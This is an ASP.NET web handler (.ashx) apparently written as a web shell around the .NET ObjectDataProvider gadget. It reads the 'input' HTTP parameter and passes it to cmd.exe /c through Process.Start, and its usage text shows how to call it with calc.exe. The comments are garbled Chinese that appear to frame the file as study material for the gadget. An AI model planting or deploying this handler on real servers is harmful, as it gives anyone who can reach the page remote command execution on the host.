<%@ WebHandler Language="C#" Class="ObjectDataProvidertyprofSpy" %>
<%@ Assembly Name="PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35" %>
<%@ Assembly Name="WindowsBase,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35" %>
using System;
using System.Web;
using System.Text;
using System.Windows.Data;

/// <summary>
/// ע�⣺���������ʵ��ѧϰ ObjectDataProvider��ı���ObjectType-typeof������Υ�����ã�
/// ��Դ��.NET�߼�������Ʒ����л�©����12�� Gadget��ObjectDataProvider
/// ���ӣ�https://mp.weixin.qq.com/s/sHKR0zlW2CsphGAmv3_KVA
/// </summary>
public partial class ObjectDataProvidertyprofSpy : IHttpHandler
{
    public bool IsReusable
    {
        get { return false; }
    }
    public static string EncodeBase64(string code_type, string code)
    {
        string encode = "";
        byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
        try
        {
            encode = Convert.ToBase64String(bytes);
        }
        catch
        {
            encode = code;
        }
        return encode;
    }
    public static string DecodeBase64(string code_type, string code)
    {
        string decode = "";
        byte[] bytes = Convert.FromBase64String(code);
        try
        {
            decode = Encoding.GetEncoding(code_type).GetString(bytes);
        }
        catch
        {
            decode = code;
        }
        return decode;
    }

    public static void CodeInject(string input)
    {
        string ExecCode = EncodeBase64("utf-8", input);
        ObjectDataProvider objectDataProvider = new ObjectDataProvider()
        {
            ObjectType = typeof(System.Diagnostics.Process)
        };
        objectDataProvider.MethodParameters.Add("cmd.exe");
        objectDataProvider.MethodParameters.Add("/c " + DecodeBase64("utf-8",ExecCode));
        objectDataProvider.MethodName = "Start";
    }

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        if (!string.IsNullOrEmpty(context.Request["input"]))
        {
            CodeInject(context.Request["input"]);
            context.Response.Write("Status: ִ����ϣ�");
        }
        else
        {
            context.Response.Write("1. example: http://www.xxxxxxx.com/ObjectDataProviderSpy.ashx?input=calc.exe\n\n");
            context.Response.Write("2. �������cmd.exe/c calc.exe ִ�����ע�⣺���������ʵ��ѧϰ ObjectDataProvider�࣬����Υ�����ã�");
        }
    }
}